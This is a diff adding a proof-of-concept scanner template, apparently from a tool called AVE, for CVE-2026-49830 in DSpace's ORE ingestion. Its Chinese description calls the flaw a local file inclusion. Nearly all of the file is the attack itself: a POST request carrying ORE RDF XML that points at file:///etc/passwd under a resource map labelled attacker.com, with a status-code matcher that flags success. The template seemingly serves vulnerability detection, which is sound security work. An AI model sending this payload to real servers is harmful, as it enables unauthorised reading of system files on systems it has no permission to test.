@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "DSpace ORE Ingestion Crosswalk URI scheme验证缺失导致本地文件包含漏洞检测。通过构造包含file:///etc/passwd的ORE XML资源映射，验证DSpace是否对非Web资源URI进行scheme校验。"
+id = "POC-AVE-2026-0319"
+name = "CVE-2026-49830 PoC"
+severity = "medium"
+tags = ["cve-2026-49830"]
+vuln_id = [
+    "CVE-2026-49830",
+    "AVE-2026-0319",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/server/api/core/items"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="UTF-8"?>
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:ore="http://www.openarchives.org/ore/terms/">
+  <ore:ResourceMap rdf:about="http://attacker.com/map">
+    <ore:aggregates rdf:resource="file:///etc/passwd"/>
+  </ore:ResourceMap>
+</rdf:RDF>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    202,
+]
+type = "status"
